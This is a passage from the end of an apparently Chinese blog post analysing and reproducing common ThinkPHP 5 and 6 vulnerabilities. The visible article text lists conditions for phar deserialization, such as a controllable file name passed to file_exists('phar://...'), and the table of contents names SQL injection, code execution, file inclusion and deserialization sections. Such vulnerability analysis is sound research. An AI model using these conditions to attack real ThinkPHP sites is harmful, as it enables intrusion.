<li><p>存在文件上传、文件名完全可控、使用了文件操作函数，例如： <code>file_exists(&#39;phar://恶意文件&#39;)</code> </p>
</li>
</ul>
<p>（满足以上任意一个条件即可）</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP5-SQL%E6%B3%A8%E5%85%A5%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">ThinkPHP5-SQL注入篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E4%B8%80"><span class="toc-number">1.1.</span> <span class="toc-text">ThinkPHP5漏洞分析之SQL注入(一)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E4%BA%8C"><span class="toc-number">1.2.</span> <span class="toc-text">ThinkPHP5漏洞分析之SQL注入(二)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E4%B8%89"><span class="toc-number">1.3.</span> <span class="toc-text">ThinkPHP5漏洞分析之SQL注入(三)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E5%9B%9B"><span class="toc-number">1.4.</span> <span class="toc-text">ThinkPHP5漏洞分析之SQL注入(四)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E4%BA%94"><span class="toc-number">1.5.</span> <span class="toc-text">ThinkPHP5漏洞分析之SQL注入(五)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E5%85%AD"><span class="toc-number">1.6.</span> <span class="toc-text">ThinkPHP5漏洞分析之SQL注入(六)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87"><span class="toc-number">2.</span> <span class="toc-text">ThinkPHP5-代码执行篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">ThinkPHP5漏洞分析之代码执行（一）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">ThinkPHP5漏洞分析之代码执行（二）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%89%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">ThinkPHP5漏洞分析之代码执行（三）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87"><span class="toc-number">3.</span> <span class="toc-text">ThinkPHP5-文件包含篇</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87"><span class="toc-number">4.</span> <span class="toc-text">ThinkPHP5-反序列化篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%885-0-24%EF%BC%89"><span class="toc-number">4.1.</span> <span class="toc-text">ThinkPHP5.0.X反序列化（5.0.24）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%885-2-24%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">ThinkPHP5.0.X反序列化（5.2.24）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5-1-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%885-1-24%EF%BC%89"><span class="toc-number">4.3.</span> <span class="toc-text">ThinkPHP5.1.X反序列化（5.1.24）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.3.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&text=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&title=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&is_video=false&description=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=thinkphp5和6常见漏洞复现及原理分析&body=Check out this article: http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&title=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&title=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&title=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&title=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&name=thinkphp5和6常见漏洞复现及原理分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/05/17/thinkphp5%E5%92%8C6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/&t=thinkphp5和6常见漏洞复现及原理分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2024
    塔菲
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
